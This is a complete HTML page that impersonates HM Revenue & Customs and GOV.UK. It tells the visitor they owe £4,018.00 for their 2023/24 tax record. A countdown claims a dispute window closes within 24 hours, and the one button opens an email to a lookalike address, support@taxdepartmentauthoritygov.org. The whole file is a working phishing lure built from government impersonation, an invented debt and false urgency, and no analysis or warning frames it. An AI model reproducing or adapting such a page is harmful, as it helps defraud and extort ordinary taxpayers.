<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HMRC | Secure Settlement</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ff87; /* Neon Mint */
            --accent: #ff3e3e; /* Warning Red */
            --bg: #08090a;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.08);
        }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 135, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(255, 62, 62, 0.05) 0%, transparent 40%);
            color: white;
            font-family: 'Plus Jakarta Sans', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Animated background glow */
        .orb {
            position: absolute;
            width: 400px; height: 400px;
            background: var(--primary);
            filter: blur(120px);
            border-radius: 50%;
            z-index: -1;
            opacity: 0.1;
            animation: float 20s infinite alternate;
        }

        @keyframes float {
            from { transform: translate(-10%, -10%); }
            to { transform: translate(10%, 10%); }
        }

        .container { width: 100%; max-width: 440px; position: relative; }

        .card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--glass-border);
            border-radius: 40px;
            padding: 48px;
            text-align: center;
            box-shadow: 0 50px 100px -20px rgba(0,0,0,0.5);
        }

        .gov-uk-logo {
            font-weight: 800;
            font-size: 14px;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .gov-uk-logo::before {
            content: "";
            width: 12px; height: 12px;
            background: var(--primary);
            border-radius: 2px;
        }

        .id-badge {
            font-family: 'JetBrains Mono';
            font-size: 10px;
            color: #666;
            letter-spacing: 1px;
            margin-bottom: 30px;
            padding: 6px 12px;
            border: 1px solid var(--glass-border);
            border-radius: 100px;
            display: inline-block;
        }

        .amount-container {
            margin-bottom: 30px;
        }

        .amount-label {
            font-size: 11px;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 8px;
            display: block;
        }

        .amount-value {
            font-size: 52px;
            font-weight: 800;
            letter-spacing: -2px;
            background: linear-gradient(to bottom, #fff, #888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .divider {
            height: 1px;
            background: linear-gradient(to right, transparent, var(--glass-border), transparent);
            margin: 30px 0;
        }

        .info-text {
            font-size: 14px;
            line-height: 1.6;
            color: #aaa;
            margin-bottom: 35px;
        }

        .main-action {
            width: 100%;
            background: white;
            color: black;
            border: none;
            padding: 20px;
            border-radius: 18px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 20px rgba(255,255,255,0.1);
        }

        .main-action:hover {
            transform: translateY(-4px);
            box-shadow: 0 15px 30px rgba(255,255,255,0.2);
            background: var(--primary);
        }

        .timer-box {
            margin-top: 30px;
            font-family: 'JetBrains Mono';
            font-size: 11px;
            color: var(--accent);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .dot {
            width: 6px; height: 6px;
            background: var(--accent);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

<div class="orb"></div>

<div class="container">
    <div class="card">
        <div class="gov-uk-logo">GOV.UK Compliance</div>
        <div class="id-badge">REF: GB-TAX-99281-Z</div>

        <div class="amount-container">
            <span class="amount-label">Balance Due</span>
            <span class="amount-value">£4,018.00</span>
        </div>

        <div class="info-text">
            Formal settlement required to finalize your 2023/24 compliance record. Access the secure payment gateway via the button below.
        </div>

        <button class="main-action" onclick="requestDetails()">
            Request Settlement Details
        </button>

        <div class="divider"></div>

        <div class="timer-box">
            <div class="dot"></div>
            URGENT: DISPUTE WINDOW CLOSES IN <span id="timer">23:59:59</span>
        </div>
    </div>
</div>

<script>
    function requestDetails() {
        const email = "support@taxdepartmentauthoritygov.org";
        const subject = "Details";
        const body = "Details";
        window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    }

    let time = 86400; 
    setInterval(() => {
        if (time > 0) time--;
        let h = Math.floor(time / 3600).toString().padStart(2, '0');
        let m = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
        let s = (time % 60).toString().padStart(2, '0');
        document.getElementById('timer').innerText = `${h}:${m}:${s}`;
    }, 1000);
</script>

</body>
</html>
